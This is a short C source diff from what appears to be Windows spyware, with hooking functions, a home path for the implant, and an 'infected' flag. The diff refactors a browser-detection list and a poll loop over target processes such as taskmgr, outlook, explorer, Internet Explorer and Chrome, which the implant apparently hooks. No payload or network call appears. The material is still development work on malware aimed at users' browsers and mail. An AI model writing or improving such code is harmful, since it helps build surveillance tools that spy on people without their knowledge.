@@ -1651,7 +1651,7 @@ char *HM_CompletePath(const char *file_name, char *buffer)
 	return buffer;
 }
 
-WCHAR *HM_CompletePathW(WCHAR *file_name, WCHAR *buffer)
+WCHAR *HM_CompletePathW(const WCHAR *file_name, WCHAR *buffer)
 {
 	_snwprintf_s(buffer, _MAX_PATH, _TRUNCATE, L"%S\\%s", shared.H4_HOME_PATH, file_name);
 	return buffer;
@@ -2066,18 +2066,16 @@ BOOL HM_HookActiveProcesses()
 
 BOOL IsBrowser(char *name)
 {
-	char *browser_name[10];
-	DWORD i;
+	const char* browser_name[] = { "opera.exe", "iexplore.exe", "firefox.exe", "chrome.exe", NULL };
 
-	browser_name[0] = "opera.exe";
-	browser_name[1] = "iexplore.exe";
-	browser_name[2] = "firefox.exe";
-	browser_name[3] = "chrome.exe";
-	browser_name[4] = "";
-
-	for(i=0; browser_name[i][0]; i++)
+	int i = 0;
+	while (browser_name[i] != NULL) {
 		if (!_stricmp(name, browser_name[i]))
 			return TRUE;
+
+		i++;
+	}
+	
 	return FALSE;
 }
 
@@ -2092,19 +2090,12 @@ BOOL IsBrowser(char *name)
 
 DWORD WINAPI PollNewApps(DWORD dummy)
 {
-	char *polled_name[PROCESS_POLLED];
+	char* polled_name[PROCESS_POLLED] = { "taskmgr.exe", "outlook.exe", "explorer.exe", "mghtml.exe", "iexplore.exe", "chrome.exe" };
 	DWORD i, loop_count = 0;
 	HANDLE hProcessSnap;
 	PROCESSENTRY32 pe32;
 	char *name_offs;
 	BOOL infected;
-
-	polled_name[0] = "taskmgr.exe";
-	polled_name[1] = "outlook.exe";
-	polled_name[2] = "explorer.exe";
-	polled_name[3] = "mghtml.exe";
-	polled_name[4] = "iexplore.exe";
-	polled_name[5] = "chrome.exe";
 
 	LOOP {
 		Sleep(HM_PTSLEEPTIME);
